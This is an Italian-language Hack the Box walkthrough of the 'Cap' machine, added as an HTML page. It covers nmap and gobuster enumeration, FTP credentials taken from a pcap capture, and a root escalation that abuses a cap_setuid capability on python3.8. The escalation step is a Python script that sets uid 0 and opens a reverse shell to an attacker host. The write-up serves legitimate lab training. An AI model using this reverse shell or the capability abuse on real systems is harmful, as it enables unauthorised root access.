@@ -1,0 +1,739 @@
+<!DOCTYPE html>
+<head>
+<title> HTB - Cap </title>
+<meta name="viewport" content="width=device-width, initial-scale=1"><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="generator" content="Org-mode"><meta name="author" content="Leonardo Tamiano">
+<link href="https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/3.3.5/css/bootstrap.min.css" rel="stylesheet">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/tonsky/FiraCode@5.2/distr/fira_code.css">
+<link rel="stylesheet" href="https://pro.fontawesome.com/releases/v5.10.0/css/all.css" integrity="sha384-AYmEC3Yw5cVb3ZcuHtOA93w35dYTsvhLPVnYs9eStHfGJvOvKxVfELGroGkvsg+p" crossorigin="anonymous"/>
+<style>
+    .theme-light {
+	--color-primary: black;
+	--color-background: white;
+	--color-text: black;
+    }
+
+    .theme-dark {
+	--color-primary: #EE72F1;
+	--color-background: #21202C;
+	--color-text: white;
+    }
+    
+    body {
+	font-family: 'Fira Code', monospace;
+	font-size: 20px;
+	background-color: var(--color-background);
+    }
+
+    div#menu {
+	position: sticky;
+	position: -webkit-sticky;
+	top: 5px;
+	z-index: 30;
+    }
+
+    div#menu button {
+	right: 0px;
+	position: absolute;
+    }
+
+    p {
+	color: var(--color-text);
+    }
+
+    h1, h2, h3, h4, h5, a {
+	color: var(--color-primary);
+    }
+
+    nav a {
+	color: var(--color-text);
+    }
+
+    nav a:hover {
+	color: var(--color-primary);
+	text-decoration: none;
+    }
+
+    ul li, ol li {
+	color: var(--color-primary);
+    }
+
+    .collapsible {
+	background-color: var(--color-background);
+	border: none;
+	text-align: left;
+    }
+    
+    .top-buffer { margin-top: 18px; }
+
+    figcaption { font-size: 15px; }
+
+    footer { text-align: center; }
+
+    .observation {
+	border-style: solid;
+	margin-top: 20px;
+	margin-bottom: 20px;
+    }
+
+    pre {
+	font-size: 20px;
+	background-color: black;
+	color: white;
+	inline-size: 900px;
+	overflow: auto;
+	word-wrap: normal;
+    }
+
+    blockquote {
+	border-left: 5px solid var(--color-primary);
+    }
+
+    blockquote p {
+	color: var(--color-text);
+    }
+
+    /* side-menu stuff */
+    .side-menu {
+	position: fixed;
+	left: 0;
+	width: 60px;
+	height: 100%;
+	z-index: 100;
+    }
+
+    .side-menu-content {
+	display: none;
+	position: absolute;
+	top: 60px;
+	left: 0px;
+	height: 100%;
+	/* background-color: var(--color-primary); */
+	z-index: 100;	
+    }
+
+    .side-menu-content ul {
+	list-style-type: none;
+	position: relative;
+	margin-left: 5px;
+	width: 100%;
+	padding-left: 0px;
+    }
+
+    .side-menu-content ul li {
+	position: relative;
+	padding-top: 5px;
+	font-size: 15px;
+	padding-left: 0px;
+    }
+
+    .side-menu-content ul li a {
+	color: var(--color-primary);
+	text-decoration: none;
+	font-weight: bold;
+    }
+
+    .toggle {
+	position: absolute;
+	display: block;
+	top: 0;
+	left: 0;
+	width: 80px;
+	height: 60px;
+	background: var(--color-background);
+    }
+
+    .toggle:hover {
+	background: var(--color-primary);
+    }
+
+    .toggle:before {
+	content: '\f0c9';
+	font-family: fontAwesome;
+	position: absolute;
+	width: 100%;
+	height: 100%;
+	line-height: 60px;
+	text-align: center;
+	font-size: 24px;
+	color: var(--color-text);
+    }
+
+    @media (max-width: 1024px) {
+	pre {
+	    inline-size: 600px;
+	}
+    }
+
+    @media (max-width: 576px) {
+	* {
+	    font-size: 10px;
+	}
+
+	h1 {
+	    font-size: 13px;
+	}
+
+	h2, h3, h4, h5 {
+	    font-size: 12px;
+	}
+
+	blockquote {
+	    font-size: 15px;
+	}
+
+	pre, li pre {
+	    font-size: 10px;
+	    color: white;
+	    inline-size: 300px;
+	    word-wrap: normal;
+	    overflow: auto;
+	}
+
+        li pre {
+	    inline-size: 250px;
+        }
+
+	.toggle {
+	    width: 30px;
+	}
+
+	.toggle:before {
+	    content: '\f0c9';
+	    font-family: fontAwesome;
+	    position: absolute;
+	    width: 100%;
+	    height: 100%;
+	    line-height: 60px;
+	    text-align: center;
+	    font-size: 12px;
+	    color: var(--color-text);
+	}	
+    }
+
+
+</style>
+
+<script type="text/x-mathjax-config">
+MathJax.Hub.Config({
+  displayAlign: "center",
+  displayIndent: "2em",
+  messageStyle: "none",
+  "HTML-CSS": {
+    scale: 100,
+    styles: {
+      ".MathJax_Display": {
+        "font-size": "100%"
+      }
+    }
+  },
+  "SVG": {
+    scale: 100,
+    styles: {
+      ".MathJax_SVG_Display": {
+        "font-size": "100%",
+        "margin-left": "-2.281em"
+      }
+    }
+  }
+});
+</script>
+<script src="https://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS_SVG"></script>
+</head>
+<body>
+<div id="content" class="container">
+<!-- Side menu stuff -->
+    
+    <div class="side-menu">
+      <div class="toggle" onClick="toggleMenu()"></div>
+      <div class="side-menu-content">
+	<ul>
+	  <li>
+	    <a href="#">
+	      <span class="icon"> </span>
+	      <span class="title"> Collapse </span>
+	    </a>
+	  </li>
+	  <li>
+	    <a href="#">
+	      <span class="icon"> </span>
+	      <span class="title"> Expand </span>
+	    </a>
+	  </li>
+	  
+	  <li>
+	    <a onClick="toggleTheme()">
+	      <span class="icon"> </span>
+	      <span class="title"> Theme </span>
+	    </a>
+	  </li>
+	</ul>
+      </div>
+    </div>
+<div class="row top-buffer"> </div>
+
+<div class="row">
+   <div class="col-xs-1"></div>
+   <div class="col-xs-10"><h1 class="title">HTB - Cap</h1>
+   </div>
+   <div class="col-xs-1"></div>
+</div> <!-- end row -->
+<div class="row">
+   <div class="col-xs-1"></div>
+   <div class="col-xs-10"><hr style="border: 1px solid #FFFFFF" />   </div>
+   <div class="col-xs-1"></div>
+</div> <!-- end row -->
+
+<div class="row">
+   <div class="col-xs-1"></div>
+   <div class="col-xs-10"><div id="outline-container-sec-" class="outline-2"><button type="button" class="collapsible">
+<h2 id="sec-" style="text-decoration: underline">  Basic Info &triangledown;</h2>
+</button><div class='sec- collapsible-content'>
+<ul class="org-ul">
+<li><p>
+<b>Table of contents</b>:
+</p>
+<nav id="table-of-contents">
+<div id="text-table-of-contents" class="bs-docs-sidebar">
+<ul>
+<li><a href="#sec-">Basic Info</a></li>
+<li><a href="#sec-1">Enumeration</a>
+<ul>
+<li><a href="#sec-1-1">nmap</a></li>
+<li><a href="#sec-1-2">gobuster</a></li>
+<li><a href="#sec-1-3">pcap file</a></li>
+</ul>
+</li>
+<li><a href="#sec-2">Priv Esc</a>
+<ul>
+<li><a href="#sec-2-1">nathan</a></li>
+</ul>
+</li>
+</ul>
+</div>
+</nav>
+</li>
+</ul>
+
+<hr >
+
+<p>
+A seguire è riportato un breve walkthrough della macchina <b>Cap</b>
+offerta dalla piattaforma Hack the Box.
+</p>
+</div>
+</div>
+   </div>
+   <div class="col-xs-1"></div>
+</div> <!-- end row -->
+
+
+<div class="row">
+   <div class="col-xs-1"></div>
+   <div class="col-xs-10"><div id="outline-container-sec-1" class="outline-2"><button type="button" class="collapsible">
+<h2 id="sec-1" style="text-decoration: underline"> 1 Enumeration &triangledown;</h2>
+</button><div id="outline-container-sec-1-1" class="outline-3"><button type="button" class="collapsible">
+<h3 id="sec-1-1" nil> 1.1 nmap &triangledown;</h3>
+</button><div id="outline-container-sec-1-1-1" class="outline-4"><button type="button" class="collapsible">
+<h4 id="sec-1-1-1" nil> 1.1.1 leo@kali:~/repos/cap$ nmap -p- cap &triangledown;</h4>
+</button><div class='sec-1-1-1 collapsible-content'>
+<pre class="example">
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-10-20 19:08 CEST
+Nmap scan report for cap (10.129.242.67)
+Host is up (0.052s latency).
+Not shown: 65532 closed ports
+PORT   STATE SERVICE
+21/tcp open  ftp
+22/tcp open  ssh
+80/tcp open  http
+
+Nmap done: 1 IP address (1 host up) scanned in 18.15 seconds
+</pre>
+</div>
+</div>
+
+<div id="outline-container-sec-1-1-2" class="outline-4"><button type="button" class="collapsible">
+<h4 id="sec-1-1-2" nil> 1.1.2 leo@kali:~/repos/cap$ nmap -sC -sV cap &triangledown;</h4>
+</button><div class='sec-1-1-2 collapsible-content'>
+<pre class="example">
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-10-20 19:08 CEST
+Stats: 0:01:19 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
+Service scan Timing: About 66.67% done; ETC: 19:10 (0:00:39 remaining)
+Nmap scan report for cap (10.129.242.67)
+Host is up (0.052s latency).
+Not shown: 997 closed ports
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     vsftpd 3.0.3
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 fa:80:a9:b2:ca:3b:88:69:a4:28:9e:39:0d:27:d5:75 (RSA)
+|   256 96:d8:f8:e3:e8:f7:71:36:c5:49:d5:9d:b6:a4:c9:0c (ECDSA)
+|_  256 3f:d0:ff:91:eb:3b:f6:e1:9f:2e:8d:de:b3:de:b2:18 (ED25519)
+80/tcp open  http    gunicorn
+| fingerprint-strings: 
+|   FourOhFourRequest: 
+|     HTTP/1.0 404 NOT FOUND
+|     Server: gunicorn
+|     Date: Wed, 20 Oct 2021 17:08:26 GMT
+|     Connection: close
+|     Content-Type: text/html; charset=utf-8
+|     Content-Length: 232
+|     &lt;!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN"&gt;
+|     &lt;title&gt;404 Not Found&lt;/title&gt;
+|     &lt;h1&gt;Not Found&lt;/h1&gt;
+|     &lt;p&gt;The requested URL was not found on the server. If you entered the URL manu
+ally please check your spelling and try again.&lt;/p&gt;
+|   GetRequest: 
+|     HTTP/1.0 200 OK
+|     Server: gunicorn
+|     Date: Wed, 20 Oct 2021 17:08:21 GMT
+|     Connection: close
+|     Content-Type: text/html; charset=utf-8
+|     Content-Length: 19386
+|     &lt;!DOCTYPE html&gt;
+|     &lt;html class="no-js" lang="en"&gt;
+|     &lt;head&gt;
+|     &lt;meta charset="utf-8"&gt;
+|     &lt;meta http-equiv="x-ua-compatible" content="ie=edge"&gt;
+|     &lt;title&gt;Security Dashboard&lt;/title&gt;
+|     &lt;meta name="viewport" content="width=device-width, initial-scale=1"&gt;
+|     &lt;link rel="shortcut icon" type="image/png" href="/static/images/icon/favicon.
+ico"&gt;
+|     &lt;link rel="stylesheet" href="/static/css/bootstrap.min.css"&gt;
+|     &lt;link rel="stylesheet" href="/static/css/font-awesome.min.css"&gt;
+|     &lt;link rel="stylesheet" href="/static/css/themify-icons.css"&gt;
+|     &lt;link rel="stylesheet" href="/static/css/metisMenu.css"&gt;
+|     &lt;link rel="stylesheet" href="/static/css/owl.carousel.min.css"&gt;
+|     &lt;link rel="stylesheet" href="/static/css/slicknav.min.css"&gt;
+|     &lt;!-- amchar
+|   HTTPOptions: 
+|     HTTP/1.0 200 OK
+|     Server: gunicorn
+|     Date: Wed, 20 Oct 2021 17:08:21 GMT
+|     Connection: close
+|     Content-Type: text/html; charset=utf-8
+|     Allow: OPTIONS, HEAD, GET
+|     Content-Length: 0
+|   RTSPRequest: 
+|     HTTP/1.1 400 Bad Request
+|     Connection: close
+|     Content-Type: text/html
+|     Content-Length: 196
+|     &lt;html&gt;
+|     &lt;head&gt;
+|     &lt;title&gt;Bad Request&lt;/title&gt;
+|     &lt;/head&gt;
+|     &lt;body&gt;
+|     &lt;h1&gt;&lt;p&gt;Bad Request&lt;/p&gt;&lt;/h1&gt;
+|     Invalid HTTP Version &amp;#x27;Invalid HTTP Version: &amp;#x27;RTSP/1.0&amp;#x27;&amp;#x27;
+|     &lt;/body&gt;
+|_    &lt;/html&gt;
+|_http-server-header: gunicorn
+|_http-title: Security Dashboard
+1 service unrecognized despite returning data. If you know the service/version, ple
+ase submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-ser
+vice :
+SF-Port80-TCP:V=7.91%I=7%D=10/20%Time=61704D04%P=x86_64-pc-linux-gnu%r(Get
+SF:Request,2FE5,"HTTP/1\.0\x20200\x20OK\r\nServer:\x20gunicorn\r\nDate:\x2
+SF:0Wed,\x2020\x20Oct\x202021\x2017:08:21\x20GMT\r\nConnection:\x20close\r
+SF:\nContent-Type:\x20text/html;\x20charset=utf-8\r\nContent-Length:\x2019
+SF:386\r\n\r\n&lt;!DOCTYPE\x20html&gt;\n&lt;html\x20class=\"no-js\"\x20lang=\"en\"&gt;
+SF:\n\n&lt;head&gt;\n\x20\x20\x20\x20&lt;meta\x20charset=\"utf-8\"&gt;\n\x20\x20\x20\x
+SF:20&lt;meta\x20http-equiv=\"x-ua-compatible\"\x20content=\"ie=edge\"&gt;\n\x20
+SF:\x20\x20\x20&lt;title&gt;Security\x20Dashboard&lt;/title&gt;\n\x20\x20\x20\x20&lt;meta
+SF:\x20name=\"viewport\"\x20content=\"width=device-width,\x20initial-scale
+SF:=1\"&gt;\n\x20\x20\x20\x20&lt;link\x20rel=\"shortcut\x20icon\"\x20type=\"imag
+SF:e/png\"\x20href=\"/static/images/icon/favicon\.ico\"&gt;\n\x20\x20\x20\x20
+SF:&lt;link\x20rel=\"stylesheet\"\x20href=\"/static/css/bootstrap\.min\.css\"
+SF:&gt;\n\x20\x20\x20\x20&lt;link\x20rel=\"stylesheet\"\x20href=\"/static/css/fo
+SF:nt-awesome\.min\.css\"&gt;\n\x20\x20\x20\x20&lt;link\x20rel=\"stylesheet\"\x2
+SF:0href=\"/static/css/themify-icons\.css\"&gt;\n\x20\x20\x20\x20&lt;link\x20rel
+SF:=\"stylesheet\"\x20href=\"/static/css/metisMenu\.css\"&gt;\n\x20\x20\x20\x
+SF:20&lt;link\x20rel=\"stylesheet\"\x20href=\"/static/css/owl\.carousel\.min\
+SF:.css\"&gt;\n\x20\x20\x20\x20&lt;link\x20rel=\"stylesheet\"\x20href=\"/static/
+SF:css/slicknav\.min\.css\"&gt;\n\x20\x20\x20\x20&lt;!--\x20amchar")%r(HTTPOptio
+SF:ns,B3,"HTTP/1\.0\x20200\x20OK\r\nServer:\x20gunicorn\r\nDate:\x20Wed,\x
+SF:2020\x20Oct\x202021\x2017:08:21\x20GMT\r\nConnection:\x20close\r\nConte
+SF:nt-Type:\x20text/html;\x20charset=utf-8\r\nAllow:\x20OPTIONS,\x20HEAD,\
+SF:x20GET\r\nContent-Length:\x200\r\n\r\n")%r(RTSPRequest,121,"HTTP/1\.1\x
+SF:20400\x20Bad\x20Request\r\nConnection:\x20close\r\nContent-Type:\x20tex
+SF:t/html\r\nContent-Length:\x20196\r\n\r\n&lt;html&gt;\n\x20\x20&lt;head&gt;\n\x20\x2
+SF:0\x20\x20&lt;title&gt;Bad\x20Request&lt;/title&gt;\n\x20\x20&lt;/head&gt;\n\x20\x20&lt;body&gt;
+SF:\n\x20\x20\x20\x20&lt;h1&gt;&lt;p&gt;Bad\x20Request&lt;/p&gt;&lt;/h1&gt;\n\x20\x20\x20\x20Inval
+SF:id\x20HTTP\x20Version\x20&amp;#x27;Invalid\x20HTTP\x20Version:\x20&amp;#x27;RTS
+SF:P/1\.0&amp;#x27;&amp;#x27;\n\x20\x20&lt;/body&gt;\n&lt;/html&gt;\n")%r(FourOhFourRequest,18
+SF:9,"HTTP/1\.0\x20404\x20NOT\x20FOUND\r\nServer:\x20gunicorn\r\nDate:\x20
+SF:Wed,\x2020\x20Oct\x202021\x2017:08:26\x20GMT\r\nConnection:\x20close\r\
+SF:nContent-Type:\x20text/html;\x20charset=utf-8\r\nContent-Length:\x20232
+SF:\r\n\r\n&lt;!DOCTYPE\x20HTML\x20PUBLIC\x20\"-//W3C//DTD\x20HTML\x203\.2\x2
+SF:0Final//EN\"&gt;\n&lt;title&gt;404\x20Not\x20Found&lt;/title&gt;\n&lt;h1&gt;Not\x20Found&lt;/h1
+SF:&gt;\n&lt;p&gt;The\x20requested\x20URL\x20was\x20not\x20found\x20on\x20the\x20se
+SF:rver\.\x20If\x20you\x20entered\x20the\x20URL\x20manually\x20please\x20c
+SF:heck\x20your\x20spelling\x20and\x20try\x20again\.&lt;/p&gt;\n");
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.or
+g/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 132.46 seconds    
+</pre>
+</div>
+</div>
+</div>
+<div id="outline-container-sec-1-2" class="outline-3"><button type="button" class="collapsible">
+<h3 id="sec-1-2" nil> 1.2 gobuster &triangledown;</h3>
+</button><div id="outline-container-sec-1-2-1" class="outline-4"><button type="button" class="collapsible">
+<h4 id="sec-1-2-1" nil> 1.2.1 leo@kali:~/repos/cap$ gobuster dir -u cap -w ~/repos/wordlists/dirbuster/directory-list-2.3-medium.txt &triangledown;</h4>
+</button><div class='sec-1-2-1 collapsible-content'>
+<pre class="example">
+===============================================================
+Gobuster v3.1.0
+by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://cap
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /home/leo/repos/wordlists/dirbuster/directory-list-2.3
+-medium.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.1.0
+[+] Timeout:                 10s
+===============================================================
+2021/10/20 19:21:51 Starting gobuster in directory enumeration mode
+===============================================================
+/data                 (Status: 302) [Size: 208] [--&gt; http://cap/]
+/ip                   (Status: 200) [Size: 17368]                
+/netstat              (Status: 200) [Size: 32198]                
+/capture              (Status: 302) [Size: 220] [--&gt; http://cap/data/3]
+Progress: 16858 / 220561 (7.64%)
+[!] Keyboard interrupt detected, terminating.
+                                                                       
+===============================================================
+2021/10/20 19:23:25 Finished
+===============================================================    
+</pre>
+</div>
+</div>
+</div>
+
+<div id="outline-container-sec-1-3" class="outline-3"><button type="button" class="collapsible">
+<h3 id="sec-1-3" nil> 1.3 pcap file &triangledown;</h3>
+</button><div class='sec-1-3 collapsible-content'>
+<p>
+Tramite <code>wireshark</code> abbiamo analizato il file presente nell'url
+<code>http://cap/data/0</code> e abbiamo trovato le seguenti credenziali per
+accedere al server ftp.
+</p>
+
+<p>
+nathan:Buck3tH4TF0RM3!
+</p>
+</div>
+</div>
+</div>
+   </div>
+   <div class="col-xs-1"></div>
+</div> <!-- end row -->
+
+
+<div class="row">
+   <div class="col-xs-1"></div>
+   <div class="col-xs-10"><div id="outline-container-sec-2" class="outline-2"><button type="button" class="collapsible">
+<h2 id="sec-2" style="text-decoration: underline"> 2 Priv Esc &triangledown;</h2>
+</button><div id="outline-container-sec-2-1" class="outline-3"><button type="button" class="collapsible">
+<h3 id="sec-2-1" nil> 2.1 nathan &triangledown;</h3>
+</button><div class='sec-2-1 collapsible-content'>
+<p>
+nathan:Buck3tH4TF0RM3!
+</p>
+</div>
+
+<div id="outline-container-sec-2-1-1" class="outline-4"><button type="button" class="collapsible">
+<h4 id="sec-2-1-1" nil> 2.1.1 sudo -l &triangledown;</h4>
+</button><div class='sec-2-1-1 collapsible-content'>
+<pre class="example">
+Sorry, user nathan may not run sudo on cap.    
+</pre>
+</div>
+</div>
+<div id="outline-container-sec-2-1-2" class="outline-4"><button type="button" class="collapsible">
+<h4 id="sec-2-1-2" nil> 2.1.2 getcap -r / 2>/dev/null &triangledown;</h4>
+</button><div class='sec-2-1-2 collapsible-content'>
+<pre class="example">
+/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
+/usr/bin/ping = cap_net_raw+ep
+/usr/bin/traceroute6.iputils = cap_net_raw+ep
+/usr/bin/mtr-packet = cap_net_raw+ep
+/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep    
+</pre>
+</div>
+</div>
+<div id="outline-container-sec-2-1-3" class="outline-4"><button type="button" class="collapsible">
+<h4 id="sec-2-1-3" nil> 2.1.3 to get root &triangledown;</h4>
+</button><div class='sec-2-1-3 collapsible-content'>
+<div class="org-src-container">
+
+<pre class="src src-python"><span style="color: #2aa1ae; background-color: #292e34;">#</span><span style="color: #2aa1ae; background-color: #292e34;">!/usr/bin/python3.8</span>
+
+<span style="color: #4f97d7; font-weight: bold;">import</span> os, socket, subprocess
+
+os.setuid(0)
+
+<span style="color: #7590db;">s</span> = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect((<span style="color: #2d9574;">"10.10.14.83"</span>, 4321))
+os.dup2(s.fileno(), 0)
+os.dup2(s.fileno(), 1)
+os.dup2(s.fileno(), 2)
+
+<span style="color: #7590db;">p</span> = subprocess.call([<span style="color: #2d9574;">"/bin/sh"</span>, <span style="color: #2d9574;">"-i"</span>])    
+</pre>
+</div>
+</div>
+</div>
+</div>
+</div>
+   </div>
+   <div class="col-xs-1"></div>
+</div> <!-- end row -->
+
+<div class="row top-buffer"> </div>
+
+<div class="row top-buffer"> </div>
+
+<div class="row">
+   <div class="col-xs-1"></div>
+   <div class="col-xs-10"><hr style="border: 1px solid #FFFFFF" />   </div>
+   <div class="col-xs-1"></div>
+</div> <!-- end row -->
+<div class="row">
+   <div class="col-xs-1"></div>
+   <div class="col-xs-10"><footer id="postamble">
+<div>
+<p class="author"><b>Author</b>: Leonardo Tamiano</p><p class="email"><b>Email</b>: <a href="mailto:leonardotamiano95@gmail.com">leonardotamiano95@gmail.com</a></p><p class="date"><b>Created</b>: 2021-10-21 gio 00:44</p>
+</div>
+</footer>
+   </div>
+   <div class="col-xs-1"></div>
+</div> <!-- end row -->
+<div class="row top-buffer"> </div>
+
+<div class="row top-buffer"> </div>
+
+<div class="row top-buffer"> </div>
+<script>
+
+      function set_sections() {
+	// -- Deal with the hiding/showing of the various sections
+	var buttons = document.getElementsByClassName('collapsible');
+
+	for (var i = 0; i < buttons.length; i++) {
+	  buttons[i].addEventListener('click', function() {
+	    var content = this.parentElement;
+	    divs = content.getElementsByTagName('div');
+	    for (var j = 0; j < divs.length; j++) {
+	      if (divs[j].style.display === '' || divs[j].style.display === 'block') {
+		divs[j].style.display = 'none';
+	      } else {
+		divs[j].style.display = 'block';
+	      }
+	    }
+	  });
+	}
+      }
+
+      function hide_sections() {
+	// -- Deal with the hiding/showing of the various sections
+	var buttons = document.getElementsByClassName('collapsible');
+	var sections_to_not_hide = ['Lecture Info', 'Overview', 'Basic Info', 'Informazioni Lezione', 'Table of Contents', 'Informazioni', 'Lecture Summary']
+
+	for (var i = 0; i < buttons.length; i++) {
+	  // -- Check which sections to hide initially
+	  html_elem = buttons[i].getElementsByTagName('h2').length > 0 ?
+	    buttons[i].getElementsByTagName('h2')[0] :
+	    buttons[i].getElementsByTagName('h3').length > 0 ?
+	    buttons[i].getElementsByTagName('h3')[0] :
+	    buttons[i].getElementsByTagName('h4')[0];
+
+	  var hide_section = true;
+
+	  for (var h = 0; h < sections_to_not_hide.length; h++) {
+	    if (html_elem.innerHTML.includes(sections_to_not_hide[h])) {
+	      hide_section = false;
+	    }
+	  }
+
+	  if (hide_section) {
+	    divs = buttons[i].parentElement.getElementsByTagName('div');
+
+	    for (var j = 0; j < divs.length; j++) {
+	      divs[j].style.display =
+		divs[j].style.display === '' || divs[j].style.display === 'block' ?
+		divs[j].style.display = 'none' :
+		divs[j].style.display = 'block';
+	    }
+	  }    
+	}
+      }
+
+      // ---------------------------
+
+      // function to set a given theme/color-scheme
+      function setTheme(themeName) {
+        localStorage.setItem('theme', themeName);
+        document.documentElement.className = themeName;
+      }
+
+      // function to toggle between light and dark theme
+      function toggleTheme() {
+        if (localStorage.getItem('theme') === 'theme-dark') {
+          setTheme('theme-light');
+        } else {
+          setTheme('theme-dark');
+        }
+      }
+
+      // Immediately invoked function to set the theme on initial load
+      (function () {
+        if (localStorage.getItem('theme') === 'theme-light') {
+          setTheme('theme-light');
+        } else {
+          setTheme('theme-dark');
+        }
+      })();
+      
+
+      // ---------------------------
+
+      // toggle menu
+      var menu_off = 1
+      
+      function toggleMenu() {
+	let menu = document.querySelector('.side-menu');
+	let menu_list = document.querySelector('.side-menu-content');
+	let toggle = document.querySelector('.toggle');
+
+	let inactive_color = getComputedStyle(document.body)
+	    .getPropertyValue('--color-background');
+
+	let active_color = getComputedStyle(document.body)
+	    .getPropertyValue('--color-primary');	
+		
+	if (menu_off) {
+	  // activate menu
+	  toggle.style.backgroundColor = active_color;
+	  menu.style.width = '170px';
+	  menu_list.style.display = 'block';
+	  menu_off = 0;
+	} else {
+	  // de-activate menu
+	  toggle.style.backgroundColor = inactive_color;
+	  menu.style.width = '60px';	  
+	  menu_list.style.display = 'none';
+	  menu_off = 1;
+	}
+      }
+
+set_sections();
+hide_sections();
+</script>
+</div>
+</body>
+</html>
